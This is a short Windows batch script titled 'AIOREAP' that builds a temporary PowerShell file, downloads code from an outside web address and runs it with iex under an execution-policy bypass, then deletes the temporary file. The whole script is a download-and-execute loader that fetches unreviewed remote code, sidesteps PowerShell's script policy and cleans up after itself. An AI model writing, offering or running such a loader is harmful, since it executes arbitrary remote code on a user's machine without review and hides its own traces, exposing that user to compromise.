@echo off
title AIOREAP
echo [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";> temp.ps1
echo iex ((New-Object System.Net.WebClient).DownloadString('https://rotf.lol/psreap'))>> temp.ps1
start /w powershell -executionpolicy bypass -file temp.ps1
ping 127.0.0.1 -n 10 > nul
del temp.ps1
exit